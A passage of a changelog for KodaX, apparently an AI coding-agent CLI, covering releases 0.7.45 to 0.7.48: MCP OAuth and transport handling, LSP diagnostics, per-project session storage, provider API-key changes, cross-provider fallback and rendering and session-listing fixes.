race; consent uses the same anti-phishing url prompt — the browser is never opened for you), then persists + refreshes the token; a mid-session `403 insufficient_scope` triggers a step-up re-login. MCP `config.auth` endpoint fields are now **optional** (provide them only to pin a static pre-registered client). New `@kodax-ai/agent` MCP exports include `setActiveUserInteraction`, `discoverOAuthEndpoints`, `performOAuthLogin`, and `McpAuthRequiredError`, plus the coding-layer `buildMcpReverseCapabilities`. **Not implemented (deliberate):** Client ID Metadata Documents (SEP-991) — DCR is the registration baseline (matches Codex). Covered by 130+ MCP tests including fake-MCP-server end-to-end cases (elicitation, `-32042` retry, OAuth callback race/buffer/cleanup, S256 refusal, and the full `401 → discovery → DCR → consent → loopback → token → retry`). See [docs/features/v0.7.48.md FEATURE_222](docs/features/v0.7.48.md).
- **MCP config `type: "http"` — transport auto-detection (ecosystem config compat).** Other MCP clients' config files use `type: "http"` as a single entry that means "an HTTP MCP server, figure out the flavour". KodaX now accepts it as a **config-layer alias** (not a wire protocol): it POSTs `initialize` as Streamable HTTP first and, only on `400/404/405`, falls back to the legacy HTTP+SSE transport — `401`/`403`/`5xx`/network errors never fall back (so an auth challenge still reaches the OAuth flow). The resolved transport is recorded in diagnostics (`http:auto->streamable-http` / `http:auto->sse`). Accepted by the REPL config validator and the ACP conversion path too.

### Changed

- **MCP catalog tolerates servers that don't implement every list.** A `-32601` (method-not-found, by error code) from `resources/list` or `prompts/list` is now treated as an empty list instead of failing the whole catalog refresh, so a tools-only server's tools stay usable. `tools/list` still hard-fails (no tools = no core capability).
- **ACP sessions now connect configured MCP servers** (resolves the long-standing gap where `mcpServers` did not take effect in editor / ACP scenarios). Reverse capabilities over ACP are roots-only (out-of-process; no interactive dialog), so elicitation/OAuth there degrade to decline.

**Deferred to v0.7.50** (see [docs/features/v0.7.50.md](docs/features/v0.7.50.md)): `sampling` (server-driven LLM calls — the runtime seam exists but is **not advertised or wired** to `@kodax-ai/llm`; security-sensitive, needs opt-in + quota guardrails) and `tasks`.

> Known test-suite note: a handful of `vitest` files (worktree / session-storage / repo-intelligence / selection / recovery) intermittently time out or hit Windows temp-dir locks under full-suite parallelism; all pass when run in isolation. These are environment/load flakes, not regressions — the MCP suite and full build are green.

## [0.7.47] - 2026-06-10

### Added

- **FEATURE_132 — Native LSP integration: edit-time diagnostics reflux (TS/JS, Python, Go, Rust, Java).** After the `write` / `edit` / `multi_edit` tools change a file, KodaX now opens it through a language server and refluxes any type ERRORs straight back into the tool result, so the agent fixes them the same turn instead of waiting for the next build (saving ≥1 LLM round-trip). Servers are discovered on `PATH` / project `node_modules` (typescript-language-server, pyright, gopls, rust-analyzer, jdtls); when none is installed the feature is **silent** (no nagging), and a one-shot blacklist + spawn-dedup keep it cheap. It is **default-on but self-limiting**: only ERROR severity, ≤20 per file, a 5s per-file wait that runs OUTSIDE the file-mutation lock, and `KODAX_LSP=0` disables it entirely. Auto-installing a missing server is **opt-in** (`KODAX_LSP_DOWNLOAD=1`; `KODAX_LSP_NO_DOWNLOAD=1` hard-off) — KodaX never runs `go install` / `npm i` unprompted. The LSP TypeScript server runs as its own subprocess, isolated from the in-process repo-intelligence TS engine. It also adds four read-only navigation tools — `lsp_definition` / `lsp_hover` / `lsp_references` / `lsp_document_symbols` — for precise, position-anchored, real-time questions about the current code (complementing the repo-scope repo-intelligence symbol tools; the tool descriptions teach the boundary). Implemented under `packages/coding/src/lsp/`; new exports from `@kodax-ai/coding`: `LspService`, `getDefaultLspService`, `shutdownDefaultLspService`, `languageIdForPath`. See [docs/features/v0.7.47.md FEATURE_132](docs/features/v0.7.47.md).
- **FEATURE_221 — Injectable self-manual for SDK consumers (`selfManual`).** Products built on the KodaX SDK (e.g. KodaX-Space) can now inject their **own** product manual so the built-in `kodax_manual` tool answers *their* users' "how do I use / configure …?" questions on-brand, instead of returning KodaX's internal manual. `runKodaX({ selfManual: { productName, topics } })` re-brands the ≤250-token routing rule + scope anchors to `productName` and **extend-merges** your `KodaXManualTopicInput[]` over KodaX's base topics (same `id` overrides, new `id` appends), so users can still ask about the underlying provider / config / SDK topics. **Opt-in and backward-compatible** — omit `selfManual` and the system prompt is byte-identical to before. Topics stay **tool-on-demand and 4 KB-capped**: nothing large is injected into the prompt, only the short routing rule. New exports from `@kodax-ai/coding`: `KodaXManualTopicInput`, `KodaXSelfManualConfig`, `ResolveKodaXManualOptions`, `buildSelfKnowledgeRoutingRule`. See [SDK Embedder Guide §13](public_docs/sdk/embedder-guide.md#13-inject-your-products-manual--selfmanual-feature_221-v0747) + [docs/features/v0.7.47.md FEATURE_221](docs/features/v0.7.47.md).
- **FEATURE_218 — KodaX self-knowledge manual + `kodax_manual` help tool.** KodaX now ships a version-bound, structured product manual (17 topics: overview / install / providers / custom-providers / config / permissions / commands / tools / agents / skills / mcp / repo-intelligence / sessions / doctor / sdk / troubleshooting) behind a read-only `kodax_manual` tool, plus a ≤250-token routing rule that tells the model to look up KodaX usage/config questions instead of guessing or mixing in Claude Code / Codex CLI knowledge. The provider list is sourced from the single-source-of-truth capability snapshots (drift-proof, not hand-copied) and each answer is anchored to KodaX scope. REPL `/help <topic>` reuses the same registry. Lookup is deterministic (exact id → alias, incl. Chinese → query token-overlap → index) and never fabricates; single-topic output ≤4 KB, index ≤2 KB. No RAG, no vector DB, no background index, no prompt bloat. See [docs/features/v0.7.47.md FEATURE_218](docs/features/v0.7.47.md).
- **MCP client — protocol `2025-11-25` compatibility (P0+P1).** KodaX's self-built MCP client now speaks the `2025-11-25` revision. **P0 (protocol compliance):** answers a server `ping` with an empty result instead of `-32601`; emits `notifications/cancelled` when a request times out (the `initialize` request is exempt); and resumes a dropped Streamable-HTTP notification stream via SSE `id`/`retry` + `Last-Event-ID`, with a reconnect cap so an empty-EOF stream can't reconnect-loop forever. **P1 (version + data surface):** advertises protocol `2025-11-25` with negotiation validation + the `MCP-Protocol-Version` header; carries tool/resource/prompt `icons` into descriptors (filtering unsafe URI schemes); and surfaces `execution.taskSupport`, failing fast on task-required tools. Unwired `elicitation` dead code removed. (Reverse / server-side capabilities are planned as FEATURE_222 for v0.7.48.)

### Changed

- **FEATURE_220 — Continuous thinking + tool-call block rendering.** Consecutive `thinking` blocks now render collapsed to a single line by default (`Ctrl+O` / show-all still expands the full content; `KODAX_THINKING_COLLAPSE=0` opts out), and a run of consecutive thinking / tool-call items reads as one continuous "working block" with the inter-item blank lines suppressed (`KODAX_TRANSCRIPT_TIGHT=0` opts out), instead of a stack of separately-titled cards. Pure transcript-rendering change — no LLM-facing prompt is touched. (The originally-planned read-only tool grouping was implemented then reverted after review, because the synthetic group key broke scroll / selection / search and churned the inline scrollback ledger.) See [docs/features/v0.7.47.md FEATURE_220](docs/features/v0.7.47.md).
- **Coding-plan provider model lineups refreshed (2026-06 gateway catch-up).** `ark-coding` drops the no-longer-routed `kimi-k2.5` and the retired `minimax-latest` floating alias, adding the two explicit MiniMax revisions the gateway now exposes — `MiniMax-M3` (Frontier Coding, native multimodal, 1M context) and `MiniMax-M2.7` (204K) — keeping its routed-model count at 11. `minimax-coding` trims the retired `M2.5` / `M2.1` / `M2` family (7 → 2 alternates), keeping `MiniMax-M2.7` (default) + `MiniMax-M3` + `MiniMax-M2.7-highspeed`, so `/model` completion and the default-model APIs only surface ids the gateway still routes (the removed ids were upstream-404 traps). Subscription placeholder cost rates updated to match.

### Fixed

- **Spawned subprocesses are now torn down as a tree, not just the direct child.** Every subprocess KodaX spawns — language servers (FEATURE_132), the `bash` tool, MCP stdio transports, the ACP server, and CLI-event children — is tracked as a managed child-process tree and killed whole on shutdown / timeout / abort (POSIX process groups, with exited groups reaped), so a terminated parent no longer orphans its grandchildren (a shell's sub-processes, a language server's workers, etc.). Centralized in `@kodax-ai/agent` (`managed-child-processes` + `process-tree`) and wired into every spawn site.

## [0.7.46] - 2026-06-07

### Added

- **FEATURE_219 — Per-project session storage (目录治理 + 归档分家 + 自动迁移).** Sessions move from a single flat `~/.kodax/sessions/<id>.jsonl` pool to a per-project layout `~/.kodax/sessions/<projectKey>/<id>.jsonl`, where `projectKey` is the canonical git repo root (worktrees of one repo merge into the same folder, surfaced with a `[wt: …]` tag), the raw cwd for non-git directories, or `_unknown/` when no path is recorded. The session picker / SDK listing now reads a single project directory (O(sessions-in-project)) instead of scanning + filtering the whole pool — eliminating the root cause of the prior listing-performance patches and the Windows drive-letter-case resume-loss class. Folder names are a readable slug plus a short hash suffix (collision-safe), with a `project.json` manifest per folder. Three previously-overlapping "archive" notions are split cleanly: the per-session island sidecar is renamed `.archive.jsonl` → `.islands.jsonl`; **whole-session archive** is now real (`archiveSession` / `unarchiveSession` move the session + sidecar into `<projectKey>/archived/`, hidden from the default list, resurfaced with `listSessions({ includeArchived: true })`); the legacy `sessions-archive/` directory is retired. Session ids gain a uniqueness suffix (`YYYYMMDD_HHMMSS_<suffix>`) so two same-second sessions in different projects never collide. **Upgrade is transparent**: the first session operation auto-migrates the flat pool under a cross-process directory lock (with stale-owner reclaim) + a resumable journal + a `.layout.json` marker, never deleting data (orphan sidecars are relocated to `_unknown/orphan-islands/`, not removed) and reading both layouts throughout via an id-only locator so an interrupted migration is never unreadable. SDK additions: `archiveSession`, `unarchiveSession`, `SessionSummary.projectKey` / `.archived`, `listSessions({ includeArchived })`. See [ADR-038](docs/ADR.md#adr-038-per-project-session-storage--canonical-keyed-directory-layout--archive-semantics-split--flat-pool-migration-feature_219-v0746) + [docs/features/v0.7.46.md#feature_219](docs/features/v0.7.46.md#feature_219-per-project-session-storage--canonical-keyed-目录治理--归档语义分家--平铺池迁移).

### Changed

- **FEATURE_214 — codex-style true inline viewport.** The inline (non-fullscreen) rendering path was rebuilt into a real bounded inline viewport (Live region + source-backed scrollback ledger) so finalized history is committed to native scrollback exactly once instead of being repeatedly repainted — fixing the "switch-to-transcript duplicates a large block" and "streaming re-paints" artifacts. Fullscreen stays the default off-SSH (env/config can switch to inline); SSH defaults to inline with `Ctrl+O` opening an alt-screen transcript modal. CJK large-scroll lag is a terminal glyph-rendering cost and is explicitly out of scope. See [docs/features/v0.7.46.md#feature_214](docs/features/v0.7.46.md).

### Performance

- **`estimateTokens` per-message WeakMap cache (`@kodax-ai/agent`).** Token estimation now memoizes per-message counts keyed by message object identity, so repeated context-size checks within a turn no longer re-tokenize unchanged history. Pure cache — identical inputs yield identical counts, no behavior change.

### Fixed

- **Repo-intelligence atomic writes retry transient Windows `EPERM` on rename.** `writeJsonFileAtomic` (used for the analysis cache / index / manifest / overview) could intermittently fail when the target was momentarily locked by antivirus, the search indexer, or a concurrent reader — on Windows this surfaces as `EPERM`/`EBUSY`/`EACCES` from `fs.rename`. It now retries a few times with a short backoff before giving up (a genuinely permanent failure still throws), so a transient lock no longer fails the repo-intelligence pass that triggered the write.
- **MCP streamable HTTP session id is now persisted across requests (`@kodax-ai/agent`).** The streamable-HTTP MCP transport now captures the server-issued `Mcp-Session-Id` response header and replays it on subsequent POST/GET requests (and sends `DELETE` on close to end the session), defers the SSE notification stream until after the first successful POST, and clears the session id on a `404` (expired session) so it reconnects cleanly. Without this, MCP servers that mandate a session id rejected every request after the initialize call.
- **SDK session listing — fast/slow path parity + 5 footgun fixes for in-process embedders.** KodaX Space reported `listSessions` returning sessions tagged with the host process's directory + capped at 10 entries; an audit of the surrounding surface uncovered 3 sibling issues with the same root cause (the SDK was assuming `process.cwd()` = project). All five are now fixed in `interactive/storage.ts` + `session/public-api.ts` + `common/utils.ts`:
  - **F1 — `storage.list()` fast path now falls back to top-level `gitRoot` when meta has no nested `runtimeInfo`** (legacy session shape). Mirrors the existing slow-path fallback at `public-api.ts:188-195`. Pre-fix, legacy sessions came back with `runtimeInfo: undefined` even though `gitRoot` was right there at the top level → SDK consumers couldn't group by project. The fallback wraps as `{ canonicalRepoRoot: gitRoot }` (the modern equivalent field; `extractRuntimeInfoSummary` remaps it back to `{ gitRoot }` on the consumer side for `SessionSummary`).
  - **F2 — `storage.list()` accepts a `limit` parameter (default 10 preserves REPL picker; SDK passes its own)**. Pre-fix `.slice(0, 10)` was hardcoded inside `list()` so any caller asking for more (`limit: 200`) silently got 10. The public-api fast path now forwards the caller's `limit` directly.
  - **F3 — `storage.list()` return type now includes `createdAt`** (previously absent from the return shape even though it was computed internally), and `toSessionSummary` carries it through. Pre-fix, every session in the fast-path return had `SessionSummary.createdAt = undefined` → SDK consumers sorting sessions by date got random order on the common-case call.
  - **F4 — `FileSessionStorage` accepts an optional `cwd` constructor arg.** In-process embedders pass the project root they opened; `load()` then threads it into `getGitRoot(cwd)` + `inspectWorkspaceRuntime({cwd})` so the workspace-mismatch check compares against the embedder's project, NOT the embedder process's startup directory. Bonus: when `cwd` is set, the CLI-mode "[Warning] Session project mismatch" stderr write is suppressed (the embedder is authoritative; the warning is noise that bleeds into the host process's UI output channel).
  - **F5 — `deleteAll()` no longer silently caps at 10.** Pre-fix it reused `list()`'s default cap, so "delete all sessions for this project" left up to N−10 sessions behind. Now passes `limit: Number.MAX_SAFE_INTEGER` so it enumerates the full set.
  - **Defense-in-depth**: `common/utils.ts` `getGitRoot()` now accepts an optional `cwd` parameter (same shape as the agent-runtime `getGitRoot` fixed earlier in v0.7.45). Existing zero-arg callers (5 sites: storage, REPL, InkREPL) unchanged.
  - 10 new regression tests (`interactive/storage-sdk-consumer.test.ts`) cover all 5 fixes + 2 existing tests in `storage.test.ts` updated to assert the new `createdAt` field. Pre-existing 237 interactive/session tests still pass.
- **SDK session listing — F6 follow-up: fast path no longer auto-filters by `process.cwd()` when no project intent is supplied.** KodaX Space reported that even after the F1–F5 fixes above + FEATURE_219 (per-project session storage), the sidebar still showed only Space-repo sessions when the user had opened a different project. Root cause: `FileSessionStorage.list(undefined)` resolved `currentGitRoot` via `getGitRoot(this.hostCwd)`, and when an embedder constructs `new FileSessionStorage()` WITHOUT `cwd`, that fell through to `git rev-parse` in the host process's `process.cwd()` — the embedder's own startup directory, NOT the project the user opened. The resulting `currentGitRoot` then drove the per-project loop at `storage.ts:1237` (`projectDirNames = currentGitRoot ? [currentProjectKey] : <all>`) to scan only the embedder's project subdir → user saw nothing. F4 above had inadvertently preserved the broken behavior for the common SDK-consumer shape (storage constructed with no `cwd`). The Space team shipped a workaround in their own code that forces the slow path by injecting `before: '2999-01-01T00:00:00.000Z'` — fragile and surprising.
  - **Fix**: when both `gitRoot` arg AND `this.hostCwd` are unset, no auto-resolve from `process.cwd()` — `currentGitRoot` stays null, and the per-project loop scans all project dirs (matching the slow path's semantic). Applied to both `list()` (Space's reported case) and `deleteAll()` (no production callers; consistency). The CLI is unaffected: REPL paths already pass `gitRoot` explicitly via `storage.list(context.gitRoot ?? undefined)`.
  - **Side update**: `packages/coding/src/agent-runtime/middleware/auto-resume.ts` now passes `options.context?.gitRoot` to `storage.list()` so CLI `kodax --resume` preserves its "pick the most recent session in this project" semantic (pre-fix it relied on the implicit `process.cwd()` resolution we just removed).
  - 2 new regression tests in `storage-sdk-consumer.test.ts` — cross-project listing without project intent + filter-by-cwd when set.
  - SDK consumers can now revert workarounds that force the slow path; the natural call shape works.
- **SDK session storage — F7 + F8 follow-up audit fixes (load()-side noise + ambiguity-resolution bug).** A focused audit after the F6 fix surfaced two more bugs that bit SDK consumers without an explicit `cwd`:
  - **F7 — `load()` mismatch warning now opt-in instead of "fires whenever no hostCwd".** The pre-fix gate was `!this.hostCwd && (...)`, meant to signal "embedder mode = silent; CLI mode = warn", but `!this.hostCwd` also matched SDK consumers that don't pass `cwd` — so KodaX Space (and any third-party embedder following the same shape) got a yellow `[Warning] Session project mismatch:` block written to `stderr` on every cross-project session load, bleeding into the host process's UI output channel. The text even named the *embedder's startup directory* as "Current workspace" — wrong and noisy. v0.7.46 inverts the gate: a new `FileSessionStorage({ emitMismatchWarnings: true })` constructor option is the explicit opt-in (default `false`). CLI surfaces that want the legacy warning pass `true`; SDK consumers get silence by default. When the flag is off, the warning path also skips the `getGitRoot` + `inspectWorkspaceRuntime` resolution entirely — cheap on the common SDK path.
  - **F8 — `resolveSessionLocation()` no longer fails silently when an ambiguous id has no current-project match.** When two sessions in different projects share an id (legacy same-second cross-project duplicates; FEATURE_219's id-uniqueness suffix prevents this going forward), the resolver picked a "preferred" match by `path.dirname(m) === this.projectDir(deriveProjectKeyFromRoot(this.hostCwd ?? process.cwd()).key)`. For SDK consumers without `cwd`, this resolved to the embedder's startup directory's projectKey — which matched neither candidate → `preferred = undefined` → `null` returned → `load()` returned null and the caller saw "session not found". Post-fix: cwd-based disambiguation runs only when `this.hostCwd` is set; otherwise the first match is returned best-effort. The diagnostic notice still fires so the caller can debug.
  - 5 new tests in `storage-sdk-consumer.test.ts` (3 F7 + 2 F8). The pre-existing F4 stderr-suppression test also had a latent issue — it was patching `process.stderr.write` but `writeStorageNotice` short-circuits on `NODE_ENV === 'test'`, so the test passed vacuously. The new F7 tests temporarily flip `NODE_ENV` to `'development'` so the real emission path runs. Full interactive + session + auto-resume sweep: 266/266 pass.

## [0.7.45] - 2026-06-01

### ⚠️ BREAKING — coding-plan providers now use dedicated API-key env vars

The coding-plan providers used to read the **same** env var as their regular-API
sibling (e.g. both `zhipu` and `zhipu-coding` read `ZHIPU_API_KEY`), which meant
you couldn't enable the two providers independently — and the regular key could
get handed to a coding-plan provider you hadn't actually subscribed to. Each
coding-plan provider now reads its **own** key, so setting both keys lets you use
both providers' models at once.

| Provider | Old env var | **New env var** |
|---|---|---|
| `zhipu-coding` | `ZHIPU_API_KEY` | `ZHIPU_CODING_API_KEY` |
| `kimi-code` | `KIMI_API_KEY` | `KIMI_CODE_API_KEY` |
| `minimax-coding` | `MINIMAX_API_KEY` | `MINIMAX_CODING_API_KEY` |
| `mimo-coding` | `MIMO_API_KEY` | `MIMO_CODING_API_KEY` |
| `ark-coding` | `ARK_API_KEY` | `ARK_CODING_API_KEY` |

**Migration**: set the new env var(s) for whichever coding plans you use. Regular
providers (`zhipu`, `kimi`, …) are unchanged. There is no fallback to the old
shared names — the new name is required for the coding-plan provider to start.

### Added

- **FEATURE_207 — `@` picker: recent files**: typing `@` now surfaces your current git working set (modified + untracked files) at the top of the completion list, before the plain directory listing — these are the files you're actively changing, which is overwhelmingly what you'll reference next. Cross-directory (nested files appear without navigating into them), filtered by basename prefix as you type, and suppressed once you navigate into a specific path (`@src/` keeps the normal listing). Non-git workspaces degrade gracefully to the directory listing. Directories were already completable; skill (`/skill:`) / MCP / plugin entries are untouched. (The recency source is the git working set rather than the originally-planned session-lineage tool events — chosen for cold-start usefulness + layer independence; see docs/features/v0.7.45.md#feature_207.)
- **FEATURE_102 — Adaptive Multi-Provider Orchestration (P1-auto + P2 + P3)**: the main agent can now run a child task on a *different* provider/model than its own. Three layers ship; P4's adaptive-scoring *mechanism* (bandit/bayesian auto-selection) is intentionally **not** built — its only actionable output, the gating eval below, shipped, and the mechanism itself is speculative with no current consumer (YAGNI per `CLAUDE.md`), so it is **deferred to 0.9.x as an independent feature** if a real auto-selection need arises. Static tier routing (P1-auto) already covers the concrete need, and is **off by default** — it activates only when you point a tier env var at a model.
  - **P2 — explicit per-dispatch override.** `dispatch_child_task` gains optional `provider` / `model` params, so the agent can deliberately send a child to another model family — e.g. a second independent review of the same change by a different family, to catch blind spots a single family would share. Resolution priority in `child-executor`: `bundle.provider/model` > specialist's declared model (FEATURE_191) > parent default. Omitting both is byte-identical to the prior behavior. Tolerant parse (empty/whitespace → undefined) so a misuse never fails the dispatch.
  - **P3 — cross-provider fallback + `doctor --ping`.** When a child's primary provider is *exhausted or down* (the LLM layer's same-provider `withRateLimit` retries gave up, a 5xx, or a network error), KodaX re-runs the child once on the next provider in an operator-configured chain instead of failing the whole child. Configured via `/fallback ark-coding,kimi-code` (persists to `~/.kodax/config.json` + mirrors to `KODAX_FALLBACK_PROVIDERS`; `/fallback off` to clear, `/fallback status` to inspect). Empty chain = OFF. Scope is deliberately minimal (per user direction): only hard availability errors trigger fallback — a returned `success:false` is a task outcome (not retried elsewhere) and aborts are never faked over; the speculative tool-call-fidelity / context-overflow / quality-anomaly triggers are unbuilt (YAGNI). `kodax doctor --ping` completes the health check: it sends one minimal request per configured provider (10s timeout, concurrent) to prove the key actually works and the subscription is active — opt-in, small token cost, never on the default `doctor`. 16 tests (11 fallback core + 5 `/fallback` command).
  - **P1-auto — `model_hint` → tier routing.** The previously dormant `model_hint` field (`fast`/`balanced`/`deep`, FEATURE_120) now selects an operator-configured tier: `fast` → `KODAX_FAST_PROVIDER`/`KODAX_FAST_MODEL` (**read-only children only** — the gating eval validated cheap-model quality on read-only investigation but not write/codegen, so write children stay on the parent tier), `deep` → `KODAX_DEEP_PROVIDER`/`KODAX_DEEP_MODEL` (read or write). `balanced`/unset, or any unconfigured tier, falls back to the parent — **routing is OFF by default** and turns on only when you point a tier env var at a model (no separate toggle). Specialist and explicit-P2 overrides both win over the hint. Per KodaX minimalism the original 5-name capability-alias layer (`vision`/`long-context`/…) was descoped to this env-tier form — no consumer exists for the rest yet (YAGNI). Pure routing wiring; the Worker prompt is unchanged (an eval non-trigger per `CLAUDE.md`), so $0 / no panel. Gating eval (`tests/feature-102-model-tier-quality.eval.ts`, canonical 5-alias × 3 read-only investigation × 5 run) kept as permanent regression: cheap floor `ark/v4flash` = 15/15, ≥ strong-mean 92% → cheap PRESERVES read-only quality. New unit + integration tests (7 `model-hint-routing` + 5 child-executor P2/P1-auto priority); also de-flaked the pre-existing `merges findings` child-executor test (parallel children made `mergeChildResults` emit in completion order — now deterministic dispatch order). Design: [docs/features/v0.7.45.md](docs/features/v0.7.45.md#phase-1--model_hint--真实跨-provider-子派发mvp).
- **FEATURE_216 — `verifyProviderCredential(name)` SDK API + per-provider strategy.** New top-level helper for SDK consumers (KodaX Space, third-party embedders) to validate a provider's API key against the actual upstream — never-throws, mostly zero-token. Closes the "test connection" UI gap: existing `isConfigured()` only checks env presence; `stream()`/`sideQuery()` are too heavy. Three primitives, one per provider, baked into `provider-capabilities.json` `verifyStrategy` field: **`count-tokens`** (Anthropic `messages.countTokens()`, 0 token) for `anthropic` + 4 anthropic-coding providers; **`models-list`** (`models.list()`, 0 token) for `openai`/`deepseek`/`kimi`/`qwen`; **`minimal-message`** (~6-7 token `chat.completions.create({max_tokens:1})`) for `zhipu`/`mimo`/`mimo-coding` (where `models.list()` is publicly-served or `count_tokens` returns 404). CLI-bridge providers (`gemini-cli`, `codex-cli`) return `unsupported` — their credentials live in the CLI binary's token store, outside SDK reach. Top-level `verifyProviderCredential(name, opts?)` short-circuits unknown name / unsupported strategy / missing env var BEFORE instantiating the provider class — avoids the constructor throw on missing key, and ALSO wraps the actual `verifyCredential()` call in try/catch so the never-throws contract survives runtime-registered providers whose 3rd-party overrides might throw instead of returning an envelope. Error categorization (`unauthorized` / `network` / `timeout` / `unsupported` / `unconfigured` / `server_error` / `rate_limited` / `unknown`) is stable for UI consumers to map to user-facing states — `rate_limited` (429) is distinct from `unauthorized` so a transiently throttled key isn't misread as invalid. The error `message` field redacts `sk-...` key fragments before truncation so upstream error bodies that echo the submitted key don't leak the fragment into UI logs. The `kimi-code`-specific 400→`unauthorized` mapping is gated by `providerName` to avoid false-positives on other count-tokens providers that might 400 on a legitimate bad request (bad model id / schema mismatch). Network error detection extended to `ETIMEDOUT` + `ENETUNREACH` + `EHOSTUNREACH` + `ENETDOWN` beyond the original `ENOTFOUND`/`ECONNREFUSED`/`ECONNRESET`/`EAI_AGAIN`/`EPIPE` set. Companion `listProviderModels(name)` returns the static curated list (always `source: 'static'` in v0.7.45 — upstream `/v1/models` is noisy + inconsistent across providers per the 2026-05-28 12-provider probe matrix). Custom providers auto-inherit by `protocol`; explicit `verifyStrategy` overrides allowed. 88 tests total (28 orchestrator + 14 resolver + 38 schema + 10 real-key integration gated on `KODAX_INTEGRATION_TEST=1`). Reference industry validator: opencode's `setup-recording-env.ts` makes the same per-provider decision across 20+ providers — per-provider strategy IS industry standard, no universal 0-token primitive exists. Design + probe data: [docs/features/v0.7.45.md#feature_216](docs/features/v0.7.45.md#feature_216-provider-credential-verification-api). SDK usage guide: [public_docs/sdk/embedder-guide.md §12](public_docs/sdk/embedder-guide.md#12-provider-credential-verification--verifyprovidercredential-feature_216-v0745).

### Performance

- **FEATURE_212 — fullscreen render no longer lags as history grows.** In the fullscreen (alt-screen) UI, every render previously rewrote the whole viewport (~6 KB of ANSI) on each frame; on Windows/ConPTY each synchronous write blocks the event loop, so typing, streaming output, scrolling, and the spinner all got progressively choppier the longer a session ran. The renderer now takes a **cell-diff fast path** in fullscreen — it writes only the cells that actually changed (default ON; escape hatch `KODAX_FULLSCREEN_CELLDIFF=0`). Typing stays smooth regardless of transcript length.
- **FEATURE_212 — DECSTBM hardware-scroll fast path.** When the transcript scrolls, the renderer now emits a single terminal scroll-region command and repaints only the rows that scrolled *in*, instead of repainting every shifted row. Reduces per-scroll-frame write volume by an order of magnitude on full screens (default ON; escape hatch `KODAX_SCROLL_DECSTBM=0`). Proven correct by a calibrated cursor+grid terminal-model differential gate.

### Fixed

- **FEATURE_212 — fullscreen viewport drifted up one row.** The cell-diff fast path above shifted the entire managed viewport up by one row (the banner's top line was clipped and a blank line appeared under the status bar). Root cause was two scroll-inducing trailing newlines that fire when the frame fills the viewport: the per-row line-feed `renderFrameSlice` emits after the *last* row, and the `restoreCursor` line-feed that moves the cursor one row past the last content row. Both are now suppressed for a viewport-filling frame (the resting cursor is clamped to the last visible row), so nothing scrolls. The cell-diff perf win is fully preserved. Reproduced and verified by an offline terminal-model gate that faithfully scrolls on a bottom-row line-feed.
- **FEATURE_213 — a follow-up typed while waiting for a sub-agent was answered but never shown.** When you queued a message while the agent was idle-yielding (waiting for a `dispatch_child_task` child), the agent received and answered it, but it never appeared in the transcript. There are two mid-turn drain paths and only one notified the UI: the `beforeNextTurn` mid-turn drain routes through `onMidTurnUserMessages` (recorded), but the idle-yield **wake** drain (`composeIdleYieldUserMessage`) spliced the prompt straight into the agent transcript with no UI signal. Fixed by giving the wake path the same UI sink: `composeIdleYieldUserMessage` reports the drained prompt(s) via a new `onUserPrompts` callback, surfaced through `runWithIdleYield`'s `onResumedUserPrompts` option (both new, optional, non-breaking SDK additions on `@kodax-ai/agent`), which coding wires to `onMidTurnUserMessages`. A message is dequeued exactly once, so no duplication. Also hardened the recorded path: `clearManagedForegroundTurnHistory` now rescues any not-yet-committed mid-turn user message before wiping the foreground ledger (id-deduped against the round-end / fresh-submit / interrupt commits), so a premature clear can't drop it either.
- **FEATURE_173 — `kodax -r` only restored the first round of a resumed session.** After FEATURE_173 consolidated session ids, the runner's snapshot writer (`saveSessionSnapshot`, a flat full-rewrite) and the REPL's incremental writer raced on the same `<id>.jsonl`: a stale runner save whose messages were a *prefix* of what the REPL had already written rebuilt the lineage and reset `activeEntryId` back to round 1 — so resume walked the active path only as far as the first round (entries were never lost, just the active pointer regressed). Fixed in two layers: (1) a new `KodaXSessionOptions.persistedByHost?: boolean` SDK option marks host-owned sessions so the runner skips routine snapshot writes and stops racing the REPL — error/crash-recovery saves (which carry `errorMetadata`) still bypass the gate and persist, so recovery is unchanged; headless print/SDK/ACP callers leave the flag unset and remain the sole writer. (2) `resolveSnapshotLineage` now reuses the existing lineage verbatim when a lineage-less snapshot's messages are a prefix of (or empty vs) the persisted active path, so `activeEntryId` can never regress structurally. New tests cover 5 writer interleavings including the exact repro and the empty-message error save.
- **archived sessions no longer appear in the session picker.** `session/public-api.ts` documents an `archived-` filename-prefix archive mechanism, and the public-api *slow* path already filtered it out, but `FileSessionStorage.list()` — used by the interactive picker and the public-api fast path — did not, so archived sessions still showed up there. Added the `!startsWith('archived-')` filter so the archive mechanism is consistent end-to-end.
- **repo-intelligence atomic writes no longer leak `.tmp` files.** `writeJsonFileAtomic` wrote to a uniquely-named `<file>.<pid>.<ts>.tmp` and renamed it into place, but had no cleanup path: any failed `rename` (common on Windows as `EPERM` when the target is briefly locked by a concurrent reader) or a hard kill between write and rename left the temp behind, and the unique naming meant each failure accumulated a fresh orphan — over a thousand could pile up in `.agent/repo-intelligence/` (hundreds of MB) over weeks. The write now removes its own temp on failure (try/catch) and best-effort sweeps stale sibling orphans (older than 1h, same base file — never a concurrent writer's in-flight temp) on each successful write, so any existing backlog self-heals on normal use.
- **empty provider completions now retry instead of silently ending the task.** A `finish_reason`-complete turn with no text, no tool calls, and no thinking is a degraded response — common on budget OpenAI-compatible providers (e.g. zhipu-coding) under load or right after a 429. The runner's no-tool terminal branch misread it as a clean text-only completion and exited the task silently (the user saw the task stop right after a `[Rate Limit] Retrying…` line, with no error). The managed-task LLM adapter now re-streams such a turn up to `KODAX_MAX_EMPTY_COMPLETION_RETRIES` times (short linear backoff) on an independent counter before falling through to the existing terminal behavior, so it does not consume the resilience error budget. Canonical text-only termination (text present, no tool) is untouched.
- **`saveSessionSnapshot` now honors `options.context.gitRoot` instead of silently dropping it.** In-process embedders (KodaX Space ADR-003) that serve multiple projects from a single runtime were having every session tagged with the host process's startup directory, because the snapshot middleware only read `data.gitRoot` (never passed by 3 of 5 call sites) and fell through to a `process.cwd()`-bound `git rev-parse`. Users saw "session disappears on restart" — sessions were being persisted under the wrong project. The middleware now follows a 4-tier resolution: (1) explicit `data.gitRoot` (existing API), (2) **`options.context.gitRoot`** (NEW — closes the bug independently of the call-site fix), (3) `getGitRoot()` running in **`options.context.executionCwd`** (NEW — defense even when neither field is set), (4) `''` (legacy default). Also patched the 3 SA-mode call sites (`run-substrate.ts:1455`, `catch-terminals.ts:106`, `iteration-limit-terminal.ts:63`) to thread `gitRoot: input.options.context?.gitRoot ?? undefined` explicitly — matches the existing convention at runner-driven.ts:407+1786 and makes the project-tag intent visible at every call site. The KodaX CLI itself was unaffected (its `process.cwd()` is the project), but any SDK consumer with a multi-project popout UI hit this. 